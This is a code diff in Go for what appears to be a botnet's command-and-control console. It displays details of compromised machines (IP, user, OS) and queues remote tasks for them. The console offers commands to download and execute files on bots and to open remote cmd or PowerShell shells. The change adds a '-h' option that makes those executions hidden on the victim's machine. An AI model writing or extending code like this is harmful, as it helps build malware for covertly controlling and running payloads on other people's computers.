@@ -39,7 +39,7 @@ func show_bot_info(bot *common.Client) {
 	fmt.Println("🐾 --------------------------------------------------- 🐾")
 	fmt.Printf("👣 ID: %d\n", bot.Id)
 	fmt.Println("🏴 Guid: " + bot.Guid)
-	fmt.Println("🌍 IP: " + bot.Ip)
+	fmt.Println("🌐 IP: " + bot.Ip)
 	fmt.Println("👽 Who: " + bot.Whoami)
 	fmt.Println("💻 OS: " + bot.Os)
 	install, _ := strconv.ParseInt(bot.Installdate, 10, 64)
@@ -63,7 +63,7 @@ func show_bot_info(bot *common.Client) {
 
 func help_handler() {
 	fmt.Println("1. help/h: Show help menu")
-	fmt.Println("2. exec path/url [args]: Execute executable file or download from host and execute")
+	fmt.Println("2. exec [-h] path/url [args]: Execute executable file or download from host and execute, option -h decides if hidden execute")
 	fmt.Println("3. cmd/pws: Remote cmd or powershell")
 	fmt.Println("4. list: Show all bots")
 	fmt.Println("5. info id: Show bot info which ID is id")
@@ -96,11 +96,22 @@ func select_handler(ary []string) {
 
 func exec_handler(ary []string) {
 	if len(ary) < 2 {
-		fmt.Println("[-] Usage: exec path/url [args], please enter help command")
+		fmt.Println("[-] Usage: exec [-h] path/url [args], please enter help command")
 		return
 	}
 	var options string = ""
-	for i := 1; i < len(ary); i++ {
+	var hidden bool = false
+
+	if ary[1] == "-h" {
+		hidden = true
+	}
+
+	i := 1
+	if hidden {
+		i++
+	}
+
+	for ; i < len(ary); i++ {
 		options += " " + ary[i]
 	}
 	options = strings.TrimSpace(options)
@@ -126,7 +137,7 @@ func exec_handler(ary []string) {
 	sqlStr = "insert into tasks (bot_id, command_id, args, status) values (?,?,?,?)"
 	map_args := map[string]interface{}{
 		"args":   options,
-		"hidden": "false",
+		"hidden": hidden,
 	}
 	byt, _ := json.Marshal(map_args)
 	_, err = db1.Insert(common.Db, sqlStr, common.CurrentBot, command_id, byt, "queued")
@@ -289,7 +300,6 @@ func main() {
 		case "mode":
 			mode_handler(cmdAry)
 		}
-
 	}
 
 }
